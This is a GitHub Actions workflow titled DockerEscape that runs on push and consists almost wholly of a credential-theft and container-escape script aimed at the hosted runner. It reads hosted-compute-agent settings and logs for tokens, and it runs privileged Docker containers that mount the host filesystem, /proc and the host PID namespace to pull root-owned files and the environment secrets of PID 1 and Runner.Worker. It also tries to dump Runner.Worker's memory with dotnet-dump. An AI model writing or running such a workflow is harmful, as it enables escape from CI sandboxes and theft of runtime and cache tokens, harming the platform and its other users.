name: DockerEscape
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - name: Read HCA files and exploit docker + dotnet diagnostic
        run: |
          echo '=== HCA .settings (world-readable) ==='
          cat /opt/hca/.settings 2>/dev/null || echo CANNOT_READ
          echo ''
          echo '=== HCA log file ==='
          cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null | grep -iE 'token|secret|key|auth|bearer|runtime|cache|credential' | head -30 || echo NO_SENSITIVE_DATA
          echo '--- FULL HCA LOG (last 100 lines) ---'
          tail -100 /opt/hca/logs/hosted-compute-agent.log 2>/dev/null | head -100
          echo ''
          echo '=== DOCKER PRIVILEGE ESCALATION ==='
          docker version 2>/dev/null | head -5 || echo 'docker unavailable'
          echo '--- Running privileged container to read root-owned files ---'
          docker run --rm --privileged -v /:/hostfs alpine sh -c 'cat /hostfs/opt/hca/diagnostics.json' 2>/dev/null || echo 'docker run failed'
          echo ''
          echo '--- Read ALL files in /opt/hca/ via docker ---'
          docker run --rm --privileged -v /opt/hca:/hca alpine sh -c 'ls -la /hca && cat /hca/diagnostics.json && cat /hca/.settings' 2>/dev/null || echo 'docker mount failed'
          echo ''
          echo '--- Read PID 1 environ via docker ---'
          WORKER_PID=$(pgrep -f Runner.Worker | head -1)
          echo WORKER_PID=$WORKER_PID
          docker run --rm --privileged -v /proc:/hostproc alpine sh -c "cat /hostproc/1/environ | tr '\\0' '\\n' | grep -iE 'TOKEN|SECRET|RUNTIME|CACHE'" 2>/dev/null || echo 'docker proc failed'
          echo ''
          echo '--- Read Runner.Worker environ via docker ---'
          docker run --rm --privileged -v /proc:/hostproc alpine sh -c "cat /hostproc/$WORKER_PID/environ | tr '\\0' '\\n'" 2>/dev/null | grep -iE 'TOKEN|SECRET|RUNTIME|CACHE|ACTION' | head -30 || echo 'docker worker proc failed'
          echo ''
          echo '=== DOTNET DIAGNOSTIC SOCKET ATTACK ==='
          ls /tmp/dotnet-diagnostic-* 2>/dev/null
          which dotnet-dump 2>/dev/null || echo 'dotnet-dump not in PATH'
          find /opt /usr -name 'dotnet-dump' 2>/dev/null | head -5
          find /opt /usr -name 'dotnet-counters' 2>/dev/null | head -5
          find /opt -name 'dotnet' -type f 2>/dev/null | head -5
          dotnet tool list -g 2>/dev/null || echo 'no global dotnet tools'
          echo '--- Try dotnet-dump collect on Worker ---'
          WORKER_PID=$(pgrep -f Runner.Worker | head -1)
          echo WORKER_PID=$WORKER_PID
          timeout 15 dotnet-dump collect --process-id $WORKER_PID --output /tmp/worker.dump 2>/dev/null || echo 'dotnet-dump failed or not available'
          ls -la /tmp/worker.dump 2>/dev/null || echo 'no dump file'
          echo '--- Try via socket ---'
          SOCK=$(ls /tmp/dotnet-diagnostic-${WORKER_PID}* 2>/dev/null | head -1)
          echo SOCK=$SOCK
          ls -la $SOCK 2>/dev/null
          echo '=== DOCKER: Mount host proc and scan Worker mem ==='
          docker run --rm --privileged --pid=host alpine sh -c "
            echo PID 1 environ:;
            cat /proc/1/environ | tr '\\0' '\\n' | grep -iE TOKEN || echo none;
            for pid in \$(ls /proc | grep -E '^[0-9]+$'); do
              cmd=\$(cat /proc/\$pid/cmdline 2>/dev/null | tr '\\0' ' ' | head -c 50);
              if echo \$cmd | grep -qi 'Runner.Worker'; then
                echo Worker PID=\$pid;
                cat /proc/\$pid/environ | tr '\\0' '\\n' | grep -iE 'ACTIONS_RUNTIME|ACTIONS_CACHE|artifactcache';
              fi;
            done
          " 2>/dev/null || echo 'docker pid-host failed'
